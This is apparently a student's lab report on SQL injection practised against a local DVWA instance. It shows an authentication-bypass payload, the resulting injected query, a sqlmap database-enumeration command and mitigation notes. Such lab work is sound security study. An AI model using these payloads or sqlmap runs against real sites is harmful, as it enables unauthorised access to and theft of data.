---

## 📜Day 4 Report

### **Web Security Basics & SQL Injection**

### **Objective: Understand and exploit SQL Injection vulnerabilities.**
---

### **Introduction**
Web security is the practice of protecting websites, applications, and APIs from malicious attacks. Among the most critical threats is SQL Injection (SQLi), a vulnerability that allows attackers to manipulate databases by injecting malicious SQL code. It ranks #1 in the OWASP Top 10 for its prevalence and impact.

### **Why SQL Injection Matters**
🔹**Data Breaches:**  Attackers can steal sensitive data (e.g., user credentials, payment info).

🔹**Data Manipulation:** Delete, modify, or insert unauthorized records.

🔹**Full System Compromise:** Escalate to remote code execution in worst-case scenarios.

---
## **📜Tasks Completed**

### **1️⃣  Set Up DVWA (Damn Vulnerable Web App)**
✔️ **Deployed via Docker:**
```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

✔️ **Access DVWA:**
  - **Navigated to **`http://localhost`** on my browser.**
  - **Logged in with credentials: **`admin`** / **`password`**.**
  - **Set the security level to **Low** (DVWA Security tab).**

### **2️⃣ Manual SQL Injection Exploit**
**✔️ Bypassed Authentication:**
  - **Payload Used:** **`' OR '1'='1' -- `**

```
-- Original Query (simplified)  
SELECT * FROM users WHERE user = '$input' AND password = '$hashed_pass';  

-- Injected Query  
SELECT * FROM users WHERE user = '' OR '1'='1' -- ' AND password = '...';  
```
📌 **Output:** Logged in as admin without a valid password.



### **3️⃣ Automated Exploitation with SQLMap**
**✔️ Command Executed:**
```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id" --dbs
```

**✔️Flags Explained:**
  - **`--dbs`:** Enumerate databases.
  - **`--cookie`:** Authenticate using your DVWA session cookie (required for access).

**✔️ Example Output:**
```
available databases [2]:  
[*] dvwa  
[*] information_schema
```


### **🚀Key Takeaways**
🔹**SQL Injection Risks:**
  - **Unfiltered user input allows attackers to manipulate database queries.**
  - **High-impact exploits: data theft, privilege escalation, and system compromise.**

🔹**Mitigation:**
  - **Parameterized queries (e.g., using PDO in PHP).**
  - **Input validation (e.g., allow only alphanumeric characters in usernames).**


![Screenshot 2025-03-04 105435](https://github.com/user-attachments/assets/be1c0958-8bee-4355-8186-f1913442869d)

![Screenshot 2025-03-04 105421](https://github.com/user-attachments/assets/31c75659-9608-4534-9363-68d9c4b6d178)

![Screenshot 2025-03-04 105408](https://github.com/user-attachments/assets/2e9e80d4-2cdf-4351-8a1a-930ff4431f46)

![Screenshot 2025-03-04 105247](https://github.com/user-attachments/assets/3e8fddbd-a948-4a9b-a061-a72ffd2ba373)

![Screenshot 2025-03-04 105232](https://github.com/user-attachments/assets/13410148-fbe1-4b5c-9145-e240e28cd537)

![Screenshot 2025-03-04 105215](https://github.com/user-attachments/assets/20e8b7ff-ef74-4976-82d8-630b7fd7ff32)

![Screenshot 2025-03-04 105200](https://github.com/user-attachments/assets/6f8df56a-532d-4e89-858f-a0ffca7e8359)

![Screenshot 2025-03-04 105113](https://github.com/user-attachments/assets/41ad3b5d-8596-4a38-850d-cd8eebd4ec7b)

![Screenshot 2025-03-04 105058](https://github.com/user-attachments/assets/67280bc3-949e-441f-bc41-6f7416edfe5b)

![Screenshot 2025-03-04 105040](https://github.com/user-attachments/assets/0d2d767d-6336-484d-be27-d255ff751518)

![Screenshot 2025-03-04 105027](https://github.com/user-attachments/assets/1a9311d8-1f68-4c09-8121-90344a4d56ef)

![Screenshot 2025-03-04 105011](https://github.com/user-attachments/assets/a60b77f9-a6a6-4c06-8726-69e45cc76610)

![Screenshot 2025-03-04 104931](https://github.com/user-attachments/assets/3282fdaa-6047-4d43-9b7f-5b446d8b7cb4)
